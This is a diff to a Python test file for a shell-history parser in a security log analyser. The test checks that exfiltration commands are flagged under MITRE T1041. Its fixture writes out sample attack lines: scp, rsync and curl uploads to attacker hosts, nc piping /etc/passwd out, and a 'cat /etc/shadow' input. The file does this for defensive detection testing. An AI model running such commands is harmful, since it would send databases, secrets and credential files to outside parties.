@@ -599,6 +599,27 @@ web_attacks:
         self.assertEqual({event.details.get("action") for event in result.events}, {"credential-file-read"})
         self.assertIn("T1552.004", {event.mitre_attack for event in result.events})
 
+    def test_shell_history_parser_detects_data_exfiltration_commands(self):
+        content = "\n".join([
+            "scp /var/backups/db.sql.gz attacker@198.51.100.10:/tmp/db.sql.gz",
+            "rsync -az ./uploads attacker@198.51.100.10:/tmp/uploads",
+            "curl --upload-file /tmp/secrets.tar.gz https://exfil.example/upload",
+            "nc 198.51.100.11 4444 < /etc/passwd",
+            "scp analyst@backup:/tmp/report ./report",
+            r"scp /tmp/report C:\Users\alice\report",
+        ]) + "\n"
+
+        result = parse_shell_history(content, "server01:/home/alice/.bash_history")
+
+        self.assertEqual(result.stats.total, 4)
+        self.assertEqual({event.rule_name for event in result.events}, {"Shell 数据外传命令"})
+        self.assertEqual({event.details.get("action") for event in result.events}, {"data-exfiltration"})
+        tags = {tag for event in result.events for tag in event.tags}
+        self.assertIn("shell-exfiltration", tags)
+        self.assertIn("data-exfiltration", tags)
+        self.assertEqual({event.mitre_attack for event in result.events}, {"T1041"})
+        self.assertNotIn("analyst@backup:/tmp/report", [event.details.get("command") for event in result.events])
+
     def test_shell_history_parser_extracts_zsh_time_and_source_context(self):
         result = parse_shell_history(
             ": 1710500000:0;cat /etc/shadow\n",
